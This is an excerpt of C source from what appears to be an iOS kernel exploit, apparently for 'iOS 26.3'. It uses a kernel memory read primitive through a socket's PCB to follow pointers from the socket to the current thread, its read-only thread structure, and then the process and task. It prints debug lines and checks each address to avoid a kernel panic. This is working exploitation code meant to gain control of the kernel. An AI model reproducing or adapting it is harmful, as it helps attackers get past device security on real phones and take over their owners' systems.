...
// iOS 26.3 compat: validate every hop in the proc_self chain.
// If any offset is wrong (e.g. off_socket_so_background_thread changed),
// we get garbage → early_kread64 treats it as valid → kernel panic.
// Catch it early here.
static uint64_t proc_self_chain(void) {
    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + off_inpcb_inp_socket);
    if(!is_kaddr_valid(rwSocketAddr)) {
        printf("[-] proc_self: invalid socket addr from pcb+0x%x = 0x%llx\n",
               off_inpcb_inp_socket, rwSocketAddr);
        return 0;
    }
    printf("[i] proc_self: socket addr = 0x%llx\n", rwSocketAddr);

    uint64_t current_thread = early_kread64(rwSocketAddr + off_socket_so_background_thread);
    if(!is_kaddr_valid(current_thread)) {
        printf("[-] proc_self: invalid thread addr from socket+0x%x = 0x%llx\n",
               off_socket_so_background_thread, current_thread);
        return 0;
    }
    printf("[i] proc_self: thread addr = 0x%llx\n", current_thread);

    uint64_t current_thread_ro = early_kread64(current_thread + off_thread_t_tro);
    if(!is_kaddr_valid(current_thread_ro)) {
        printf("[-] proc_self: invalid thread_ro addr from thread+0x%x = 0x%llx\n",
               off_thread_t_tro, current_thread_ro);
        return 0;
    }
    printf("[i] proc_self: thread_ro addr = 0x%llx\n", current_thread_ro);

    uint64_t selfProc = early_kread64(current_thread_ro + off_thread_ro_tro_proc);
    if(!is_kaddr_valid(selfProc)) {
        printf("[-] proc_self: invalid proc addr from thread_ro+0x%x = 0x%llx\n",
               off_thread_ro_tro_proc, selfProc);
        return 0;
    }
    printf("[i] proc_self: proc addr = 0x%llx\n", selfProc);
    return selfProc;
}

static uint64_t task_self_chain(void) {
    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + off_inpcb_inp_socket);
    if(!is_kaddr_valid(rwSocketAddr)) return 0;

    uint64_t current_thread = early_kread64(rwSocketAddr + off_socket_so_background_thread);
    if(!is_kaddr_valid(current_thread)) return 0;

    uint64_t current_thread_ro = early_kread64(current_thread + off_thread_t_tro);
    if(!is_kaddr_valid(current_thread_ro)) return 0;

    uint64_t selfTask = early_kread64(current_thread_ro + off_thread_ro_tro_task);
    if(!is_kaddr_valid(selfTask)) return 0;
    return selfTask;
}

uint64_t proc_self(void) {
    if(!gSelfProc) {
        gSelfProc = proc_self_chain();
        if(!gSelfProc) {
            printf("[-] proc_self: chain failed, cannot get self proc\n");
            return 0;
        }
    }
    return gSelfProc;
...
uint64_t task_self(void) {
    if(!gSelfTask) {
        gSelfTask = task_self_chain();
        if(!gSelfTask) {
            printf("[-] task_self: chain failed, cannot get self task\n");
            return 0;
        }
    }
    return gSelfTask;
